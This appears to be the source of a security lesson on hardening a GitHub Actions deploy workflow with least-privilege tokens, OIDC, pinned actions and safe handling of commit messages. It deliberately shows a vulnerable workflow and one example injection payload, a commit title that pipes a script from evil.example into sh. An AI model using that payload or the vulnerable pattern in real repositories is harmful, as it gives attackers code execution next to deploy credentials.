// Source of the Sanity lesson document. Build: node content/tools/build-lesson.mjs <this folder>
// Narrative only - quiz answers and test cases live in challenges.json (-> Postgres).
// Template: core-first (content/PROMPT_CONTEXT.md O2).
export default ({ h2, p, bullets, code, callout, challenge }) => ({
    _id: "lesson-gha-2-3",
    title: "Secrets, OIDC and least-privilege tokens",
    slug: { _type: "slug", current: "github-actions-secrets-oidc-permissions" },
    description:
        "A security review of Rice Rocket's web deploy workflow found stored AWS keys, a write-all token, an action on a moving tag and a commit message pasted into a shell script. Learn the five rules behind those findings - token permissions, OIDC role assumption, trust policy subjects, pinned actions and untrusted input - and fix the workflow.",
    estimatedTime: 16,

    scenario: {
        role: "Backend developer at Rice Rocket, a food-delivery startup in Ho Chi Minh City",
        problem:
            "The static site in web/ deploys to S3 behind CloudFront from a GitHub Actions workflow. Before the company signs a payment partner, a security review reads that workflow and flags four problems. Any one of them lets a leaked key or a crafted commit reach the production bucket.",
    },

    content: [
        h2("Situation"),
        p("This is `deploy-web.yml` as the review found it. It works: every push to main that touches `web/` builds the site and publishes it."),
        code("yaml", `
name: deploy-web
on:
  push:
    branches: [main]
    paths: ["web/**"]

permissions: write-all

jobs:
  deploy:
    runs-on: ubuntu-24.04
    defaults:
      run:
        working-directory: web
    steps:
      - uses: actions/checkout@v5
      - uses: actions/setup-node@v5
        with:
          node-version: 24
      - run: npm ci
      - run: npm run build
      - name: Log the release
        run: echo "Deploying: \${{ github.event.head_commit.message }}"
      - name: Assume the deploy role
        uses: aws-actions/configure-aws-credentials@v4
        with:
          aws-access-key-id: \${{ secrets.AWS_ACCESS_KEY_ID }}
          aws-secret-access-key: \${{ secrets.AWS_SECRET_ACCESS_KEY }}
          aws-region: ap-southeast-1
      - run: aws s3 sync dist s3://rice-rocket-web --delete
      - run: aws cloudfront create-invalidation --distribution-id E2RICEROCKET01 --paths "/*"`, ".github/workflows/deploy-web.yml"),
        bullets([
            "The IAM user behind `AWS_ACCESS_KEY_ID` was created two years ago. Its key never expires and also sits in two laptops' `~/.aws/credentials`.",
            "`permissions: write-all` lets every step push code, create releases and approve pull requests with the job's token.",
            "`@v4` is a tag. Whoever controls the action's repository can move it to new code, and the next deploy runs that code next to the AWS credentials.",
            "A commit titled `Fix\"; curl -s https://evil.example/x.sh | sh; echo \"` would close the echo's quotes and run the download on the runner.",
        ]),

        h2("The core you need"),
        bullets([
            "**The GITHUB_TOKEN has scopes.** Every job gets a token for its own repository. `permissions:` at the workflow level sets them for all jobs; `permissions:` on a job replaces that for the job. A map grants only the scopes it names, every other scope becomes `none`, so `contents: read` must be listed when the job checks out a private repository.",
            "**OIDC instead of stored keys.** With `id-token: write`, a job can ask GitHub for a signed token that says which repository, ref or environment it runs for. `aws-actions/configure-aws-credentials` with `role-to-assume` trades that token for AWS credentials that expire within an hour. Nothing long-lived is stored in GitHub.",
            "**The trust policy decides who gets the role.** The IAM role trusts `token.actions.githubusercontent.com` and checks the token's `sub`. A job that uses `environment: production` gets `repo:rice-rocket/app:environment:production`; a branch run gets `repo:rice-rocket/app:ref:refs/heads/<branch>`. Match the exact value, never `repo:rice-rocket/app:*`.",
            "**Pin actions to a commit.** `owner/action@<40-character SHA>` always runs the same code; a tag or a branch can be moved. Keep the version in a comment (`# v4`) so people and Dependabot can read it. Actions owned by GitHub (`actions/*`) are commonly kept on tags.",
            "**Untrusted input never goes inside `${{ }}` in `run:`.** The runner pastes the expression's value into the script before the shell sees it. Commit messages, pull request titles and bodies, branch names and issue comments are written by other people. Put them in `env:` and use `\"$VAR\"`: the shell then treats the value as data.",
            "**`pull_request_target` runs with secrets.** It runs the base branch's workflow with a write token and the repository's secrets, even for forks. Never check out and run the pull request's code there.",
        ]),

        h2("Apply it in the project"),
        p("First the AWS side: an OIDC identity provider for `token.actions.githubusercontent.com` (audience `sts.amazonaws.com`) and a role whose trust policy accepts only the production environment of this repository:"),
        code("json", `
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": { "Federated": "arn:aws:iam::123456789012:oidc-provider/token.actions.githubusercontent.com" },
    "Action": "sts:AssumeRoleWithWebIdentity",
    "Condition": {
      "StringEquals": {
        "token.actions.githubusercontent.com:aud": "sts.amazonaws.com",
        "token.actions.githubusercontent.com:sub": "repo:rice-rocket/app:environment:production"
      }
    }
  }]
}`, "rice-rocket-web-deploy trust policy"),
        p("The role's permission policy allows `s3:ListBucket`, `s3:PutObject` and `s3:DeleteObject` on `rice-rocket-web` and `cloudfront:CreateInvalidation` on one distribution, nothing else. Then the workflow:"),
        code("yaml", `
name: deploy-web
on:
  push:
    branches: [main]
    paths: ["web/**"]

permissions:
  contents: read                # default for every job

jobs:
  deploy:
    runs-on: ubuntu-24.04
    timeout-minutes: 15
    environment: production     # the OIDC sub becomes ...:environment:production
    permissions:
      contents: read
      id-token: write           # this job only may request an OIDC token
    defaults:
      run:
        working-directory: web
    steps:
      - uses: actions/checkout@v5
      - uses: actions/setup-node@v5
        with:
          node-version: 24
      - run: npm ci
      - run: npm run build
      - name: Log the release
        env:
          MESSAGE: \${{ github.event.head_commit.message }}
        run: echo "Deploying: $MESSAGE"
      - name: Assume the deploy role
        uses: aws-actions/configure-aws-credentials@e3dd6a429d7300a6a4c196c26e071d42e0343502 # v4
        with:
          role-to-assume: arn:aws:iam::123456789012:role/rice-rocket-web-deploy
          aws-region: ap-southeast-1
      - run: aws s3 sync dist s3://rice-rocket-web --delete
      - run: aws cloudfront create-invalidation --distribution-id E2RICEROCKET01 --paths "/*"`, ".github/workflows/deploy-web.yml"),
        callout("info", "Where the SHA comes from",
            "The SHA above stands in for a real one. Copy the commit of the release you reviewed from the action's releases page (or `git ls-remote https://github.com/aws-actions/configure-aws-credentials refs/tags/v4`), and add `package-ecosystem: github-actions` to `.github/dependabot.yml` so pull requests bump the SHA and the comment together."),

        h2("Verify"),
        code("bash", `
gh run watch                                   # the deploy run after a push to main
gh run view --log | grep -A2 'Assume the deploy role'
#   Assuming role with OIDC
#   Authenticated as assumedRoleId AROA...:GitHubActions
aws cloudtrail lookup-events \\
  --lookup-attributes AttributeKey=EventName,AttributeValue=AssumeRoleWithWebIdentity \\
  --max-results 1 --query 'Events[0].Username'
gh secret list                                 # AWS_ACCESS_KEY_ID and AWS_SECRET_ACCESS_KEY are gone
aws iam list-access-keys --user-name rice-rocket-deploy   # no keys left on the old user
actionlint .github/workflows/deploy-web.yml    # no "potentially untrusted" expression warning`, "terminal"),

        h2("Pitfalls"),
        bullets([
            "**Job `permissions:` replaces the workflow's, it does not add to it.** A job that sets only `id-token: write` loses `contents: read` and its checkout fails with \"Repository not found\" on a private repository. Detect it in the checkout step's log; list every scope the job needs.",
            "**Leaving the old keys alive.** Switching the workflow to OIDC does not revoke anything. Delete the repository secrets and the IAM user's access keys the same day, and check `aws iam list-access-keys` and `gh secret list`.",
            "**A trust policy written while testing.** `repo:rice-rocket/app:*` or a `StringLike` with `*` often survives from the first experiment. Any branch can then write a workflow that assumes the production role. Read the `sub` values in CloudTrail and match only the environment.",
        ]),

        challenge("chal_quiz_gha_161"),
        p("Now fix the workflow the review flagged. The editor holds the fixed file with its key blocks missing, each marked by a `# [ ]` line: click a piece to fill a line, or drag it onto one. Some pieces are the original, vulnerable versions. Run checks the token scopes, how AWS credentials are obtained, how the commit message reaches the shell, and which actions are pinned."),
        challenge("chal_coding_gha_162"),
    ],
});
